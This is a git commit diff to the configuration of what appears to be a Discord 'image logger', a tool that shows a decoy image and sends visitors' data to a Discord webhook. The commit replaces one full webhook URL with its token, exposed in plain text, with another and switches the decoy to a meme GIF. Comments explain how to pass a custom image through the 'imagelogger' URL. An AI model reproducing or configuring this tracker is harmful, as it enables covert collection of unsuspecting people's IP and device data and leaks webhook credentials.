4fdfd2e89461f02864cc126d39f745d60663939f
bobux <243224772+bobuxv3@users.noreply.github.com>
2026-03-26 11:21:14 -0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1486746286035042376/ZmAV3OoyeaMS9EezMWw9ccV0TTyegjC9STyLQ-80tDRhJCJZMGFt46W5D6742IP0r9A2        ",
+            "image": "https://tenor.com/view/funny-memes-woody-toy-story-buzz-lightyear-crazy-gif-11440332646420790381", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
